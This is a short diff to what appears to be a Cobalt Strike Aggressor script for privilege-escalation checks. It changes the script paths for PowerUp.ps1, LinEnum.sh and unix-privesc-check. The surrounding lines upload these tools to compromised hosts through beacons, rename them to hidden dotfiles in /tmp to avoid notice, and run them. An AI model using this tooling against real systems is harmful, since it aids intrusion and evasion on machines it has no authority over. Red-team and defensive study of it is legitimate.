@@ -8,7 +8,7 @@ popup beacon_bottom {
 				local('$bid');
 				foreach $bid ($1){
 					binput($bid, "powershell-import PowerUp.ps1");
-					bpowershell_import($bid, script_resource("scripts/PowerUp.ps1"));
+					bpowershell_import($bid, script_resource("PrivescKit/scripts/PowerUp.ps1"));
 					binput($bid, "powershell Invoke-AllChecks");
 					bpowershell($bid, "Invoke-AllChecks");
 				}
@@ -24,7 +24,7 @@ popup ssh {
 				local('$bid');
 				foreach $bid ($1){
 					bcd($1, "/tmp");
-					bupload($1, script_resource("scripts/LinEnum.sh"));
+					bupload($1, script_resource("PrivescKit/scripts/LinEnum.sh"));
 					bshell($1, "mv /tmp/LinEnum.sh /tmp/.AGq4yheattttt5y.sh");
 					bshell($1, "chmod +x /tmp/.AGq4yheattttt5y.sh")
 					bshell($1, "/tmp/.AGq4yheattttt5y.sh -t");
@@ -35,7 +35,7 @@ popup ssh {
 				local('$bid');
 				foreach $bid ($1){
 					bcd($1, "/tmp");
-					bupload($1, script_resource("scripts/unix-privesc-check"));
+					bupload($1, script_resource("PrivescKit/scripts/unix-privesc-check"));
 					bshell($1, "mv /tmp/unix-privesc-check /tmp/.AGr5qgrakHSTR");
 					bshell($1, "chmod +x /tmp/.AGr5qgrakHSTR");
 					bshell($1, "/tmp/.AGr5qgrakHSTR detailed");
